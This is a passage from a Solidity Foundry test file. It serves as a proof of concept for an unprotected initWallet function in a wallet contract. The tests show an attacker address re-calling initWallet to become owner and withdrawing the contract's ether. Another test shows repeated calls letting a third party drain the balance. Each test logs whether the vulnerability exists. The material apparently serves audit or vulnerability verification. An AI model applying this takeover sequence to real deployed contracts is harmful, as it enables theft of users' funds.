        console.log("Contract balance: %d", address(wallet).balance);
        console.log("Attempting attacker withdrawal before exploitation...");
        vm.prank(attacker);
        try IWallet(address(wallet)).withdraw() {
            revert("Vulnerability not Exist: Attackers shouldn't withdraw before exploit");
        } catch {
            console.log("Attacker withdrawal reverted correctly (not yet owner)");
        }

        // Attacker exploit - become owner
        console.log("--- TRIGGER: Attacker calls initWallet ---");
        vm.prank(attacker);
        wallet.initWallet();

        console.log("--- AFTER-Trigger (Attack Complete) ---");
        assertEq(getCreator(), attacker, "Attacker should be creator");
        console.log("New creator address: %s", getCreator());

        // Verify exploitation by attempting withdrawal
        console.log("Attempting legitimate withdrawal as new owner...");
        vm.prank(attacker);
        IWallet(address(wallet)).withdraw();
        console.log("Contract balance after withdrawal: %d", address(wallet).balance);

        // Final vulnerability verification
        if (address(wallet).balance < 1 ether) {
            console.log("Vulnerability Exists: Attacker successfully became owner and withdrew funds");
        } else {
            console.log("Vulnerability not Exist: Failed to withdraw funds after ownership change");
        }
    }

    function testInitWalletCanBeCalledMultipleTimes() public {
        // Fund the contract
        vm.deal(address(wallet), 1 ether);

        // Set initial owner
        vm.prank(owner);
        wallet.initWallet();

        // Attack sequence
        address thirdParty = address(0x3);
        vm.prank(attacker);
        wallet.initWallet();

        vm.prank(thirdParty);
        wallet.initWallet();

        // Verify third party can withdraw
        vm.prank(thirdParty);
        IWallet(address(wallet)).withdraw();

        finalCheck();
    }

    function finalCheck() internal {
        console.log("--- FINAL VULNERABILITY VERIFICATION ---");
        if (address(wallet).balance == 0) {
            console.log("Vulnerability Exists: Multiple initWallet calls allowed fund withdrawal");
        } else {
            console.log("Vulnerability not Exist: Failed to withdraw funds");
        }
    }
}
